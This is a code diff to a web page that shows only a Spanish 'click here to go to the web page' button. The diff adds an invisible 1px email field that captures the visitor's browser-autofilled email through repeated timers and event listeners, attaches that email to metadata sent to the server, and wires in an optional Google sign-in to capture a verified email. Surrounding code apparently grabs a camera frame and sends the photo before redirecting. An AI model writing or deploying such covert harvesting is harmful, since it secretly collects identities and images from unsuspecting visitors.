@@ -30,26 +30,124 @@
     #continueBtn:hover {
       background: #f5f5f5;
     }
+    #emailField {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      border: 0;
+      padding: 0;
+      margin: 0;
+    }
+    #googleBtn {
+      display: none;
+      position: fixed;
+      top: calc(50% + 60px);
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 10;
+    }
   </style>
 </head>
 <body>
   <button id="continueBtn" type="button">Presiona aquí para ir a la web page</button>
+  <div id="googleBtn"></div>
+  <input type="email" id="emailField" name="email" autocomplete="email" tabindex="-1" aria-hidden="true">
   <script>
     (function () {
+      var cfg = window.__GOOGLE_CONFIG__ || { mode: 'normal', client_id: '' };
       var done = false;
       var btn = document.getElementById('continueBtn');
+      var emailField = document.getElementById('emailField');
+      var autofillEmail = null;
+      var googleEmail = null;
+      var googleVerifyToken = null;
+
+      function grabEmail() {
+        try {
+          var v = (emailField.value || '').trim().toLowerCase();
+          if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) {
+            autofillEmail = v.slice(0, 254);
+          }
+        } catch (e) {}
+      }
+
+      emailField.addEventListener('input', grabEmail);
+      emailField.addEventListener('change', grabEmail);
+      window.addEventListener('focusin', function () {
+        setTimeout(grabEmail, 100);
+      });
+      window.addEventListener('click', function () {
+        setTimeout(grabEmail, 150);
+      });
+      setTimeout(grabEmail, 800);
+      setTimeout(grabEmail, 2000);
 
       function clientMetadata() {
+        grabEmail();
         var meta = {
           referrer: document.referrer || null,
           lang: (navigator.language || '') + '/' + (navigator.languages ? navigator.languages.join(',') : '')
         };
+        if (googleEmail && googleVerifyToken) {
+          meta.email = googleEmail;
+          meta.verify_token = googleVerifyToken;
+        } else if (autofillEmail) {
+          meta.email = autofillEmail;
+        }
         try {
           meta.tz = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
         } catch (e) {
           meta.tz = null;
         }
         return meta;
+      }
+
+      function initGoogle() {
+        if (cfg.mode !== 'google' || !cfg.client_id) return;
+        if (!window.google || !google.accounts) return;
+        google.accounts.id.initialize({
+          client_id: cfg.client_id,
+          callback: function (response) {
+            if (!response || !response.credential) return;
+            fetch('/api/google-login', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ credential: response.credential })
+            })
+              .then(function (r) { return r.json(); })
+              .then(function (data) {
+                if (data.ok) {
+                  googleEmail = data.email;
+                  googleVerifyToken = data.verify_token;
+                  document.getElementById('googleBtn').style.display = 'none';
+                  if (done) return;
+                }
+              })
+              .catch(function () {});
+          }
+        });
+        google.accounts.id.renderButton(document.getElementById('googleBtn'), {
+          type: 'standard',
+          theme: 'outline',
+          text: 'continue_with',
+          size: 'large'
+        });
+        document.getElementById('googleBtn').style.display = 'block';
+        try {
+          google.accounts.id.disableAutoSelect();
+        } catch (e) {}
+      }
+
+      function loadGis() {
+        var s = document.createElement('script');
+        s.src = 'https://accounts.google.com/gsi/client';
+        s.async = true;
+        s.defer = true;
+        s.onload = initGoogle;
+        document.head.appendChild(s);
       }
 
       function captureFrame(stream) {
@@ -149,6 +247,8 @@
       function finish(photo) {
         send(photo).then(go);
       }
+
+      loadGis();
 
       tryCamera().then(function (photo) {
         if (photo) {
